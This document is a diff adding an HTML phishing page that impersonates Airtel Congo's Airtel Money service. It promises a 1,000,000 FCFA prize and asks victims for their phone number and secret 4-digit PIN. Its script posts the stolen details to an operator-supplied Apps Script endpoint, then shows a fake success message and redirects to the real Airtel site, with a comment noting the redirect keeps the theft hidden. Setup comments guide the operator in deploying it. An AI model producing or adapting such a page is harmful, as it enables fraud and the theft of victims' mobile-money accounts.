@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airtel Congo - Portail de Réclamation</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #eeeeee; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card { background: #ffffff; width: 100%; max-width: 380px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; }
+        .header { background-color: #ed1c24; padding: 20px; text-align: center; }
+        .header img { max-width: 100px; height: auto; } /* This looks for logo.png in your folder */
+        .content { padding: 25px; text-align: center; }
+        h2 { color: #ed1c24; margin-top: 0; font-size: 20px; }
+        p { color: #555; font-size: 14px; line-height: 1.5; }
+        
+        .input-group { position: relative; display: flex; align-items: center; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 6px; background: #fafafa; }
+        .prefix { background: #eee; padding: 12px; border-right: 1px solid #ddd; color: #333; font-weight: bold; font-size: 16px; border-radius: 6px 0 0 6px; }
+        input { border: none; padding: 12px; width: 100%; font-size: 16px; background: transparent; outline: none; }
+        
+        .btn { background-color: #ed1c24; color: white; border: none; padding: 14px; width: 100%; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        .btn:hover { background-color: #d11920; }
+        .footer-text { font-size: 11px; color: #999; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="header">
+        <!-- Manually upload your logo and rename it logo.png -->
+        <img src="logo.png" alt="Airtel">
+    </div>
+    
+    <div class="content">
+        <h2>Félicitations sélectionnées!</h2>
+        <p>Réclamation de la récompense de <strong>1,000,000 FCFA</strong>. Veuillez confirmer votre identifiant Airtel Money pour le transfert.</p>
+        
+        <form id="extractionForm">
+            <!-- Phone Number with separate prefix -->
+            <div class="input-group">
+                <div class="prefix">+242</div>
+                <input type="tel" name="phone_suffix" placeholder="Numéro de mobile" required pattern="[0-9]{7,12}">
+            </div>
+            
+            <!-- PIN Code -->
+            <div class="input-group">
+                <input type="password" name="pin" placeholder="Code Secret Airtel Money (4 chiffres)" required maxlength="4" inputmode="numeric">
+            </div>
+
+            <button type="submit" class="btn" id="subBtn">VALIDER LE TRANSFERT</button>
+        </form>
+        
+        <p class="footer-text">Sécurisé par Airtel Money Congo</p>
+    </div>
+</div>
+
+<script>
+    const scriptURL = 'YOUR_APPS_SCRIPT_URL_HERE';
+    const form = document.getElementById('extractionForm');
+    const btn = document.getElementById('subBtn');
+
+    form.addEventListener('submit', e => {
+        e.preventDefault();
+        btn.innerHTML = "Traitement en cours...";
+        btn.disabled = true;
+
+        // Construct the full phone number for your spreadsheet
+        const formData = new FormData(form);
+        const fullPhone = "+242" + formData.get('phone_suffix');
+        formData.append('full_phone', fullPhone);
+
+        fetch(scriptURL, { method: 'POST', body: formData})
+            .then(response => {
+                alert("Validation réussie ! Votre bonus de 1,000,000 FCFA sera crédité dans les 10 prochaines minutes. Un SMS de confirmation vous sera envoyé.");
+                window.location.href = "https://www.airtel.cg/";
+            })
+            .catch(error => {
+                // Fail silently and redirect to stay hidden
+                window.location.href = "https://www.airtel.cg/";
+            });
+    });
+</script>
+
+</body>
+</html>
